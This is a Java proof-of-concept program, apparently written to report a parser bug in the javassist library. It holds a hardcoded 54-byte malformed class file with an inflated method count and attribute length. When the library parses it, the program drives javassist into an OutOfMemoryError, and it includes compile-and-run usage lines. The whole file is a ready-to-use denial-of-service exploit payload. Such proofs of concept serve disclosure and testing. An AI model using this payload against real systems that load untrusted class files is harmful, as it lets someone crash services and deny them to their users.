import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import javassist.ClassPool;
import javassist.CtClass;

/**
 * PoC for javassist ClassFile parser OutOfMemoryError vulnerability.
 *
 * A crafted 54-byte class file with methods_count=65278 and an attribute
 * length of ~1.42 GB causes javassist to allocate excessive memory via
 * AttributeInfo.<init>, triggering java.lang.OutOfMemoryError.
 *
 * Usage:
 *   javac -cp javassist.jar Poc.java
 *   java -Xmx256m -cp javassist.jar:. Poc crash.bin
 */
public class Poc {
    public static void main(String[] args) throws Exception {
        byte[] data;
        if (args.length > 0) {
            data = Files.readAllBytes(Paths.get(args[0]));
        } else {
            data = new byte[] {
                (byte)0xca, (byte)0xfe, (byte)0xba, (byte)0xbe,
                (byte)0x14, (byte)0x0f, (byte)0x00, (byte)0x00,
                (byte)0x00, (byte)0x02, (byte)0x01, (byte)0x00,
                (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x00,
                (byte)0x00, (byte)0x01, (byte)0x00, (byte)0x00,
                (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,
                (byte)0xfe, (byte)0xfe, (byte)0xff, (byte)0xff,
                (byte)0xf4, (byte)0xbf, (byte)0x31, (byte)0x9a,
                (byte)0x00, (byte)0x01, (byte)0x00, (byte)0x01,
                (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,
                (byte)0xfe, (byte)0xfe, (byte)0xff, (byte)0xff,
                (byte)0xf4, (byte)0xbf, (byte)0x31, (byte)0x9a,
                (byte)0x00, (byte)0x01, (byte)0x5b, (byte)0x00,
                (byte)0x01, (byte)0xcb
            };
        }

        System.out.println("Input size: " + data.length + " bytes");
        ClassPool pool = ClassPool.getDefault();

        try {
            CtClass cc = pool.makeClass(new ByteArrayInputStream(data));
            System.out.println("Class loaded: " + cc.getName());
            System.exit(2);
        } catch (IOException e) {
            System.out.println("IOException: " + e.getClass().getName() + ": " + e.getMessage());
        } catch (RuntimeException e) {
            System.out.println("RuntimeException: " + e.getClass().getName() + ": " + e.getMessage());
        } catch (OutOfMemoryError e) {
            System.out.println("[!] OutOfMemoryError triggered: " + e.getMessage());
            e.printStackTrace();
            System.exit(137);
        }
    }
}
